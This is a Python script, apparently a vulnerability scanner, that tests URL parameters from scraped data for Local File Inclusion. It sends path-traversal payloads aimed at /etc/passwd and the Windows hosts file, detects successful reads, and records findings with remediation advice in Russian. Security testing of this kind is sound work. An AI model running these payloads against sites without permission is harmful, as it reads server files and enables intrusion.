import asyncio
import aiohttp
import logging
import json

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def test_lfi(session, base_url, param):
    lfi_payloads = [
        'passwd',
        'etc/passwd',
        '../../../../etc/passwd',
        '../../../../../../windows/system32/drivers/etc/hosts',
        '../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../windows/system32/drivers/etc/hosts'
    ]
    for payload in lfi_payloads:
        # Формируем URL правильно, заменяя значение параметра, а не добавляя новый параметр
        payloaded_url = f"{base_url.split('?')[0]}?{param}={payload}"
        logger.info(f"Testing LFI with URL: {payloaded_url}")
        try:
            response = await session.get(payloaded_url)
            response_text = await response.text()
            logger.info(f"Response for {payloaded_url}: {response_text[:100]}")  # Логируем первые 100 символов ответа
            if 'root:' in response_text or '127.0.0.1' in response_text:
                logger.info(f"LFI vulnerability found: {payloaded_url}")
                return True, payloaded_url
        except Exception as e:
            logger.error(f"Error testing LFI payload on {base_url}: {e}")
    return False, None

async def analyze_lfi(scraped_data):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        for page in scraped_data:
            url = page['URL']
            params = page.get('Parameters', {})
            for param in params:
                logger.info(f"Analyzing URL: {url} with param: {param}")
                is_vulnerable, vulnerable_url = await test_lfi(session, url, param)
                if is_vulnerable:
                    vulnerabilities.append({
                        'url': url,
                        'parameter': param,
                        'is_vulnerable': True,
                        'type': 'LFI',
                        'payload': vulnerable_url,
                        'description': (
                            "LFI (Local File Inclusion) уязвимость позволяет злоумышленнику читать локальные файлы на сервере, "
                            "используя относительные пути в параметрах URL."
                        ),
                        'risk_level': "🔴 Высокий",
                        'recommendation': (
                            "Для предотвращения LFI атак рекомендуется:\n"
                            "1. Проверять и фильтровать все входные данные, исключая использование относительных путей.\n"
                            "2. Использовать белые списки допустимых значений для параметров, связанных с файлами.\n"
                            "3. Отключить функции включения файлов, если они не используются.\n"
                            "4. Регулярно обновлять и патчить ПО.\n"
                        )
                    })
    return vulnerabilities

def load_scraped_data(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        logger.info(f"Scraped data loaded from {file_path}")
        return data
    except Exception as e:
        logger.error(f"Error loading scraped data from {file_path}: {e}")
        return []

if __name__ == '__main__':
    scraped_data = load_scraped_data('scraped_data.json')
    vulnerabilities = asyncio.run(analyze_lfi(scraped_data))
    with open('lfi_vulnerabilities.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=4)
